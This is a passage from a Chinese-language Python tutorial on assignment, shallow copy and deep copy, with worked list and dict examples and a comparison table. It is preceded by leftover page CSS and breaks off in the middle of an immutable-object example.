input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>引言：
在 Python 编程中，赋值、浅拷贝、深拷贝是处理数据复制时的核心操作 —— 很多新手会因混淆三者的区别，导致数据被意外修改，引发难以排查的 bug。本文聚焦<strong>深浅拷贝</strong>这一核心知识点，从底层原理、使用场景到实战避坑，带你彻底掌握不同拷贝方式的本质，精准控制数据的复制逻辑。</p>
<h2 data-id="heading-0">一、深浅拷贝的核心背景：Python 的对象引用机制</h2>
<p>要理解深浅拷贝，首先要明确 Python 的核心规则：<strong>变量存储的不是数据本身，而是数据对象的引用（内存地址）</strong> 。</p>
<ul>
<li>不可变对象（int、str、tuple）：修改时会创建新对象，原引用指向新地址；</li>
<li>可变对象（list、dict、set）：修改时不会创建新对象，而是直接修改原地址的数据，所有指向该地址的变量都会受影响。</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 示例：可变对象的引用特性</span>
a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
b = a  <span class="hljs-comment"># 赋值：b和a指向同一个列表对象</span>
b.append(<span class="hljs-number">4</span>)
<span class="hljs-built_in">print</span>(a)  <span class="hljs-comment"># 输出：[1,2,3,4]（a也被修改）</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(a) == <span class="hljs-built_in">id</span>(b))  <span class="hljs-comment"># 输出：True（内存地址相同）</span>
</code></pre>
<p>赋值仅传递引用，而非复制数据 —— 这也是深浅拷贝存在的核心原因：当需要 “真正复制” 数据，而非共享引用时，就需要用到拷贝操作。</p>
<h2 data-id="heading-1">二、浅拷贝（Shallow Copy）：仅复制表层结构</h2>
<h3 data-id="heading-2">1. 浅拷贝的定义</h3>
<p>浅拷贝会创建一个<strong>新的容器对象</strong>，但容器内的元素依然引用原对象的元素（即只拷贝 “第一层”，深层元素仍共享引用）。</p>
<h3 data-id="heading-3">2. 浅拷贝的实现方式</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-comment"># 原数据：嵌套可变对象（列表包含列表）</span>
original = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-number">4</span>]

<span class="hljs-comment"># 方式1：使用copy模块的copy()函数（推荐）</span>
shallow1 = copy.copy(original)
<span class="hljs-comment"># 方式2：列表切片（仅适用于序列类型）</span>
shallow2 = original[:]
<span class="hljs-comment"># 方式3：对象的copy方法（如list.copy()）</span>
shallow3 = original.copy()

<span class="hljs-comment"># 验证：新对象与原对象地址不同（表层已拷贝）</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(original) != <span class="hljs-built_in">id</span>(shallow1))  <span class="hljs-comment"># 输出：True</span>

<span class="hljs-comment"># 验证：深层元素仍共享引用</span>
shallow1[<span class="hljs-number">1</span>].append(<span class="hljs-number">5</span>)
<span class="hljs-built_in">print</span>(original[<span class="hljs-number">1</span>])  <span class="hljs-comment"># 输出：[2,3,5]（原数据的深层列表被修改）</span>
<span class="hljs-built_in">print</span>(shallow1[<span class="hljs-number">1</span>] == original[<span class="hljs-number">1</span>])   <span class="hljs-comment"># 输出：True（地址相同）</span>
</code></pre>
<h3 data-id="heading-4">3. 浅拷贝的适用场景</h3>
<ul>
<li>数据为<strong>单层结构</strong>的可变对象（如 <code>[1,2,3]</code>、<code>{"a":1}</code>）；</li>
<li>无需修改深层元素，仅需独立操作表层结构的场景；</li>
<li>追求拷贝效率（浅拷贝比深拷贝更快，占用内存更少）。</li>
</ul>
<h2 data-id="heading-5">三、深拷贝（Deep Copy）：完全复制所有层级</h2>
<h3 data-id="heading-6">1. 深拷贝的定义</h3>
<p>深拷贝会创建一个<strong>全新的独立对象</strong>，递归复制原对象的所有层级元素 —— 新对象与原对象完全隔离，修改任意层级的元素都不会影响对方。</p>
<h3 data-id="heading-7">2. 深拷贝的实现方式</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-comment"># 原数据：嵌套可变对象</span>
original = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-number">4</span>]

<span class="hljs-comment"># 使用copy模块的deepcopy()函数</span>
deep = copy.deepcopy(original)

<span class="hljs-comment"># 验证：新对象与原对象地址不同</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(original) != <span class="hljs-built_in">id</span>(deep))  <span class="hljs-comment"># 输出：True</span>

<span class="hljs-comment"># 验证：深层元素也完全独立</span>
deep[<span class="hljs-number">1</span>].append(<span class="hljs-number">5</span>)
<span class="hljs-built_in">print</span>(original[<span class="hljs-number">1</span>])  <span class="hljs-comment"># 输出：[2,3]（原数据不受影响）</span>
<span class="hljs-built_in">print</span>(deep[<span class="hljs-number">1</span>])      <span class="hljs-comment"># 输出：[2,3,5]（仅深拷贝对象被修改）</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(original[<span class="hljs-number">1</span>]) != <span class="hljs-built_in">id</span>(deep[<span class="hljs-number">1</span>]))  <span class="hljs-comment"># 输出：True（深层地址不同）</span>
</code></pre>
<h3 data-id="heading-8">3. 深拷贝的适用场景</h3>
<ul>
<li>数据包含<strong>嵌套可变对象</strong>（如 <code>[[1,2], [3,4]]</code>、<code>{"info": {"age": 20}}</code>）；</li>
<li>需要完全独立操作数据，避免修改相互影响的场景；</li>
<li>数据持久化、数据备份等需要 “纯净副本” 的场景。</li>
</ul>
<h2 data-id="heading-9">四、赋值、浅拷贝、深拷贝对比</h2>
<p>为了更清晰区分三者，我们用表格总结核心差异：</p>

































<table><thead><tr><th>操作方式</th><th>是否创建新对象</th><th>表层元素是否独立</th><th>深层元素是否独立</th><th>适用场景</th></tr></thead><tbody><tr><td>赋值</td><td>❌ 否</td><td>❌ 共享</td><td>❌ 共享</td><td>仅需引用数据，无需独立操作</td></tr><tr><td>浅拷贝</td><td>✅ 是</td><td>✅ 独立</td><td>❌ 共享</td><td>单层可变对象、追求拷贝效率</td></tr><tr><td>深拷贝</td><td>✅ 是</td><td>✅ 独立</td><td>✅ 独立</td><td>嵌套可变对象、需完全隔离数据</td></tr></tbody></table>
<h3 data-id="heading-10">实战对比示例</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-comment"># 原数据</span>
data = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-string">"scores"</span>: [<span class="hljs-number">80</span>, <span class="hljs-number">90</span>]}

<span class="hljs-comment"># 1. 赋值</span>
assign = data
assign[<span class="hljs-string">"scores"</span>].append(<span class="hljs-number">95</span>)
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"scores"</span>])  <span class="hljs-comment"># [80,90,95]（原数据被改）</span>

<span class="hljs-comment"># 重置原数据</span>
data = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-string">"scores"</span>: [<span class="hljs-number">80</span>, <span class="hljs-number">90</span>]}

<span class="hljs-comment"># 2. 浅拷贝</span>
shallow = copy.copy(data)
shallow[<span class="hljs-string">"scores"</span>].append(<span class="hljs-number">95</span>)
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"scores"</span>])  <span class="hljs-comment"># [80,90,95]（深层仍被改）</span>
shallow[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"Bob"</span>
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"name"</span>])    <span class="hljs-comment"># Alice（表层独立）</span>

<span class="hljs-comment"># 重置原数据</span>
data = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-string">"scores"</span>: [<span class="hljs-number">80</span>, <span class="hljs-number">90</span>]}

<span class="hljs-comment"># 3. 深拷贝</span>
deep = copy.deepcopy(data)
deep[<span class="hljs-string">"scores"</span>].append(<span class="hljs-number">95</span>)
deep[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"Bob"</span>
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"scores"</span>])  <span class="hljs-comment"># [80,90]（完全不受影响）</span>
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"name"</span>])    <span class="hljs-comment"># Alice</span>
</code></pre>
<h2 data-id="heading-11">五、深浅拷贝的避坑要点</h2>
<h3 data-id="heading-12">1. 不可变对象的拷贝 “特例”</h3>
<p>对不可变对象（int、str、tuple）执行深浅拷贝，结果等同于赋值 —— 因为不可变对象无法修改，Python 会优化为共享引用，避免不必要的内存消耗：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

a = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 不可变元组</span>
b = copy.copy(a)
c = copy.deepcopy(a)
